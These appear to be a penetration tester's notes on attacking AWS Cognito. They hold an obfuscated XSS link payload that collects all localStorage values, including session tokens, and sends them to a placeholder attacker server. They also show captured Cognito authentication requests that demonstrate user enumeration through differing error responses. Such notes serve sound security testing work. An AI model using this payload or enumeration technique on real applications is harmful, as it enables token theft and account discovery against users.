# AWS Cognito

Verantwortliche/r: Max Randhahn
Status: Nicht begonnen

[GitHub - padok-team/cognito-scanner: A simple script which implements different Cognito attacks such as Account Oracle or Priviledge Escalation](https://github.com/padok-team/cognito-scanner)

[AWS Cognito pentest methodology | Padok Security](https://security.padok.fr/en/blog/aws-cognito-pentest)

[Hacking AWS Cognito Misconfigurations](https://notsosecure.com/hacking-aws-cognito-misconfigurations)

[AWS Pentesting | HackTricks Cloud | HackTricks Cloud](https://cloud.hacktricks.xyz/pentesting-cloud/aws-security)

# Local Storage

- Cognito stores confidential data like the idToken in the local storage
    - The idToken can be exchanged for an X-Amz-Security-Token
    - This token allows us to use the application normally and has to be sent with each authenticated request
- If a XSS is present in the application we can retrive the local storage

```elixir
<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;(function(){var data='';for(var i=0;i<localStorage.length;i++){var key=localStorage.key(i);data+=key+'='+localStorage.getItem(key)+'&';}var img=new Image();img.src='https://<ATTACKER_SERVER>/?'+encodeURIComponent(data);})();">Click me</a>
```

# Custom AWS Auth Flow

- Sometimes we will find a custom authentication flow
    - https://docs.aws.amazon.com/de_de/cognito/latest/developerguide/amazon-cognito-user-pools-authentication-flow.html#Using-SRP-password-verification-in-custom-authentication-flow

```elixir
POST / HTTP/2
Host: cognito-idp.eu-central-1.amazonaws.com
Content-Length: 915
Content-Type: application/x-amz-json-1.1
X-Amz-Target: AWSCognitoIdentityProviderService.InitiateAuth
X-Amz-User-Agent: aws-amplify/5.0.4 js
Origin: <redacted>
...

{
  "AuthFlow": "USER_SRP_AUTH",
  "ClientId": "<redacted>",
  "AuthParameters": {
    "USERNAME": "doesExists@mail.com",
    "SRP_A": "6fb2ae742e77391<SNIP>"
  },
  "ClientMetadata": {}
}
```

```elixir
{
  "ChallengeName": "PASSWORD_VERIFIER",
  "ChallengeParameters": {
    "SALT": "262d635d0234687ea78851cdd66eb377",
    "SECRET_BLOCK": "KMA/EAaQR8WqXi<SNIP>",
    "SRP_B": "c03dfe21a2a9fa0a54c1<SNIP>",
    "USERNAME": "071337d9-11a0-44bb-a20b-c346fc9c6c83", # <-- Returns a valid UUID 
    "USER_ID_FOR_SRP": "071337d9-11a0-44bb-a20b-c346fc9c6c83"
  }
}
```

- Sometimes developers forget to add rate-limiting or allow to enumerate users through different responses when a wrong combination was entered

```elixir
{
  ...
  "AuthParameters": {
    "USERNAME": "doesNotExists@park-here.eu",
    "SRP_A": "6fb2ae742e77391<SNIP>"
  },
  ...
} 
```

```elixir
{"__type":"UserNotFoundException","message":"User does not exist."} # Returns an error
```